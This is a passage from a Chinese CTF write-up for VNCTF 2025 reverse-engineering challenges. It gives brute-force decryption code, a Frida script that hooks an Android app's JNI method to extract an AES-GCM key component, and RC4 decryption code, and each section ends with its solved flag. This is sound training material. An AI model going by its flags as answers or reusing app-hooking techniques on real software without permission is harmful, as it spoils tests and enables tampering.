class="string">&#x27;1&#x27;</span>) + (i2 % <span class="number">4</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) (str3[i2] + <span class="string">&#x27;7&#x27;</span> + (i2 % <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">codes</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= a.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index + <span class="number">1</span>] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        codes(a, index + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 解密一层</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encflag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>().decode(<span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(encflag);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">candidates</span> <span class="operator">=</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!?.~&amp;*()_+=@#$%^&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">decrypted</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">currentIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 爆破</span></span><br><span class="line">        <span class="keyword">while</span> (currentIndex &lt; encflag.length())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历候选字符</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : candidates.toCharArray())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 加密</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">encrypted</span> <span class="operator">=</span> encrypt(decrypted + String.valueOf(c));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断加密后的后两个字符是否与目标字符串匹配</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> encrypted.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> encflag.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (s1.equals(s2))</span><br><span class="line">                &#123;</span><br><span class="line">                    decrypted.append(c);</span><br><span class="line">                    currentIndex += <span class="number">2</span>;</span><br><span class="line">                    found = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出还原的明文</span></span><br><span class="line">        System.out.println(decrypted.toString());</span><br><span class="line">        <span class="comment">// VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{u_re4l1y_kn0w_H0Ok_my_f1Sh!1l}</strong></p><h3 id="kotlindroid"><a href="#kotlindroid" class="headerlink" title="kotlindroid"></a>kotlindroid</h3><p>jadx分析发现有个check函数，这个Base64加密后的应该就是Flag，然后查看交叉调用找到上层。</p><p><img src="/2025/02/12/VNCTF2025/kot1.png" alt="d0aed962ce69b047bd07052cc50206ac"></p><p>发现下面这边调用了check，传进来了一个key，直接动调断点获取。</p><p><img src="/2025/02/12/VNCTF2025/kot2.png" alt="img"></p><p>在这边断点，即可看到两个modifiedKey数组，合并起来就是16字节的Key了。</p><p>{97,116,114,105,107,101,121,115,115,121,101,107,105,114,116,97}</p><p><img src="/2025/02/12/VNCTF2025/kot3.png" alt="cd8e014f2fe16b9a2a1bba1e2226049e"></p><p>但是这边没看到和base64相关加密，全局搜索base64在SearchActivityKt$sec$1中的invokeSuspend函数中看到。</p><p>这边应该就是那边check函数invoke后跳过来的，可以看到是AES GCM加密，IV是”114514”，Key是Check那边断点拿到的，AAD数据没法直接获取，使用frida hook拦截JNI.INSTANCE.getAt()函数。</p><p><img src="/2025/02/12/VNCTF2025/kot4.png" alt="QQ_1739079484622"></p><p><img src="/2025/02/12/VNCTF2025/kot5.png" alt="QQ_1739079580281"></p><p>frida代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">package_name = <span class="string">&quot;com.atri.ezcompose&quot;</span></span><br><span class="line"></span><br><span class="line">hook_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">        var JNI = Java.use(&#x27;com.atri.ezcompose.JNI&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var instance = JNI.INSTANCE.value;</span></span><br><span class="line"><span class="string">        console.log(&#x27;INSTANCE: &#x27; + instance);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        instance.getAt.implementation = function () &#123;</span></span><br><span class="line"><span class="string">            var result = this.getAt();</span></span><br><span class="line"><span class="string">            console.log(&quot;getAt result: &quot; + result);</span></span><br><span class="line"><span class="string">            return result;</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;Error: &quot; + e);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line">    session = device.attach(<span class="string">&quot;ezCompose&quot;</span>)</span><br><span class="line">    script = session.create_script(hook_script)</span><br><span class="line">    script.load()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># INSTANCE: com.atri.ezcompose.JNI@f264edc</span></span><br><span class="line"><span class="comment"># getAt result: mysecretadd</span></span><br></pre></td></tr></table></figure><p>拦截到ADD数据为”mysecretadd”</p><p>可以从主加密流程看到最后Base64是将IV加上被加密数据后在进行编码，所以将被加密的Flag进行Base64解码后去掉前面的”114514”就是原密文。</p><p>使用java进行解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.GCMParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">IV</span> <span class="operator">=</span> <span class="string">&quot;114514&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] Key = &#123;<span class="number">97</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">101</span>,<span class="number">107</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">97</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] AAdBytes = &#123;<span class="number">109</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">100</span>&#125;;</span><br><span class="line">        <span class="comment">// 原密文</span></span><br><span class="line">        <span class="type">int</span> [] Enc  = &#123;<span class="number">0x1c</span>,<span class="number">0xcb</span>,<span class="number">0x89</span>,<span class="number">0x28</span>,<span class="number">0xb3</span>,<span class="number">0x96</span>,<span class="number">0xd4</span>,<span class="number">0x1a</span>,<span class="number">0x82</span>,<span class="number">0x02</span>,<span class="number">0x2d</span>,<span class="number">0x8c</span>,<span class="number">0xc6</span>,<span class="number">0x91</span>,<span class="number">0xd8</span>,<span class="number">0x8c</span>,<span class="number">0x68</span>,<span class="number">0xe9</span>,<span class="number">0x3e</span>,<span class="number">0xaf</span>,<span class="number">0x36</span>,<span class="number">0x5d</span>,<span class="number">0x74</span>,<span class="number">0x3f</span>,<span class="number">0x8e</span>,<span class="number">0x0c</span>,<span class="number">0x79</span>,<span class="number">0x59</span>,<span class="number">0x8a</span>,<span class="number">0xd9</span>,<span class="number">0xd8</span>,<span class="number">0xc5</span>,<span class="number">0x79</span>,<span class="number">0xdd</span>,<span class="number">0xaf</span>,<span class="number">0x71</span>,<span class="number">0x8d</span>,<span class="number">0x05</span>,<span class="number">0x5b</span>,<span class="number">0x45</span>,<span class="number">0xa5</span>,<span class="number">0x5d</span>,<span class="number">0x46</span>,<span class="number">0x25</span>,<span class="number">0xc5</span>,<span class="number">0xad</span>,<span class="number">0x29</span>,<span class="number">0xfa</span>,<span class="number">0x11</span>,<span class="number">0xc4</span>,<span class="number">0x0f</span>,<span class="number">0xcc</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">GCMParameterSpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GCMParameterSpec</span>(<span class="number">128</span>, IV.getBytes());</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] aas = <span class="keyword">new</span> <span class="title class_">byte</span>[Enc.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Enc.length; i++) &#123;</span><br><span class="line">            aas[i] = (<span class="type">byte</span>) Enc[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES_128/GCM/NoPadding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE,keySpec,spec);</span><br><span class="line">        cipher.updateAAD(AAdBytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] Original = cipher.doFinal(aas);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Original, java.nio.charset.StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VNCTF&#123;Y0U_@re_th3_Ma5t3r_0f_C0mp0s3&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{Y0U_@re_th3_Ma5t3r_0f_C0mp0s3}</strong></p><h3 id="抽奖转盘"><a href="#抽奖转盘" class="headerlink" title="抽奖转盘"></a>抽奖转盘</h3><p>jadx分析hap文件中的modules.abc文件</p><p><img src="/2025/02/12/VNCTF2025/zp1.png" alt="e2917f062e0a2de095ca14ce3b6c365e"></p><p>在MyPage下发现一段字节数组。</p><p><img src="/2025/02/12/VNCTF2025/zp2.png" alt="QQ_1739080781927"><img src="/2025/02/12/VNCTF2025/zp6.png" alt="QQ_1739080763900"></p><p>获取到一个字符串存到lexenv_0_0中，进行了一次forEach对每个字节进行了加密计算。然后再调用函数对比那个字节数组与被加密的字符串，比较是否相等，这边应该就是最后的一次加密和对比。可以将这段字节数组进行逆向计算，可以得到一串明文。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123; <span class="number">101</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">68</span>, <span class="number">118</span>, <span class="number">69</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">83</span>, <span class="number">62</span>, <span class="number">111</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">53</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">127</span>, <span class="number">115</span>, <span class="number">124</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">93</span>, <span class="number">115</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">7</span>;</span><br><span class="line">EncFlag[i] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.44s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="comment">// aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出字符串像是Base64加密。</p><p>可以看到hap文件下有一个libhello.so。jadx全局搜索可以看到有调用libhello里面的MyCry函数，应该就是加密函数。</p><p><img src="/2025/02/12/VNCTF2025/zp3.png" alt="QQ_1739081075481"></p><p>使用IDA进行逆向分析libhello.so，通过字符串搜搜MyCry查找交叉引用找到Call。</p><p>可以看到以下流程很清晰，获取字符串，将字符串进行RC4加密（密钥为”Take_it_easy”），然后再进行Base64加密，这边判断了一个值是否等于40走不同分支。</p><p>RC4加密流程没被魔改，就最后将加密数据多异或了一个值，两个分支分别是异或上了40和24。尝试后发现40可以解密出明文。</p><p>将之前解密到的Base64字串进行decode然后RC4解密即可。</p><p><img src="/2025/02/12/VNCTF2025/zp4.png" alt="QQ_1739081335258"></p><p><img src="/2025/02/12/VNCTF2025/zp5.png" alt="QQ_1739081364253"></p><p>解密代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">s[i] = i;</span><br><span class="line">k[i] = key[i % Len_k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Data, <span class="type">unsigned</span> <span class="type">long</span> Len_D, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">rc4_init</span>(s, key, Len_k);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len_D; k++) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">Data[k] = Data[k] ^ s[t];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Cyberchef Base64 Decode(&quot;aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs&quot;)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;<span class="number">0x68</span>,<span class="number">0xB2</span>,<span class="number">0x79</span>,<span class="number">0x68</span>,<span class="number">0x9A</span>,<span class="number">0x8E</span>,<span class="number">0xFC</span>,<span class="number">0x0A</span>,<span class="number">0x41</span>,<span class="number">0xA4</span>,<span class="number">0x0F</span>,<span class="number">0xC2</span>,<span class="number">0xF5</span>,<span class="number">0x2F</span>,<span class="number">0x20</span>,<span class="number">0x50</span>,<span class="number">0x8B</span>,<span class="number">0x1A</span>,<span class="number">0xD4</span>,<span class="number">0xC4</span>,<span class="number">0x83</span>,<span class="number">0x06</span>,<span class="number">0xD8</span>,<span class="number">0xA3</span>,<span class="number">0x28</span>,<span class="number">0x37</span>,<span class="number">0xAA</span>,<span class="number">0x63</span>,<span class="number">0x0B</span>,<span class="number">0x33</span>,<span class="number">0x89</span>,<span class="number">0x36</span>,<span class="number">0x2C</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] ^= <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;Take_it_easy&quot;</span>;</span><br><span class="line"><span class="built_in">rc4_crypt</span>(EncFlag, <span class="number">33</span>, Key, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] -= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.33s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line"><span class="comment">// VNCTF&#123;JUst_$ne_Iast_dance_2025!&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{JUst_$ne_Iast_dance_2025!}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-2025-WP&quot;&gt;&lt;a href=&quot;#VNCTF-2025-WP&quot; class=&quot;headerlink&quot; title=&quot;VNCTF 2025 WP&quot;&gt;&lt;/a&gt;VNCTF 2025 WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot;</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
